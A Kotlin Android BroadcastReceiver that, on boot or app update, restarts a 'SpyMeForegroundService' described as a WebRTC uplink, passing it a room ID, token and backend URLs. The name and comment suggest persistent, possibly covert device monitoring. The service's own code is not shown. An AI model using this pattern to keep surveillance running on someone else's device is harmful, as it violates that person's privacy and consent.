package com.anonymous.scure_beat

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.os.Build
import android.util.Log

class BootReceiver : BroadcastReceiver() {
    override fun onReceive(context: Context, intent: Intent) {
        val action = intent.action
        Log.d(MyApplication.TAG, "BootReceiver received action: $action")
        
        if (action == Intent.ACTION_BOOT_COMPLETED || 
            action == "android.intent.action.QUICKBOOT_POWERON" || 
            action == Intent.ACTION_MY_PACKAGE_REPLACED) {
            
            // Start the SpyMeForegroundService (WebRTC uplink) on boot,
            // passing config from BuildConfig so it can reconnect.
            val serviceIntent = Intent(context, SpyMeForegroundService::class.java).apply {
                putExtra("ROOM_ID", BuildConfig.ROOM_ID)
                putExtra("TOKEN", BuildConfig.TOKEN)
                putExtra("USERNAME", BuildConfig.USERNAME)
                putExtra("BACKEND_URL", BuildConfig.BACKEND_URL)
                putExtra("WS_URL", BuildConfig.WS_URL)
            }
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                context.startForegroundService(serviceIntent)
            } else {
                context.startService(serviceIntent)
            }
        }
    }
}
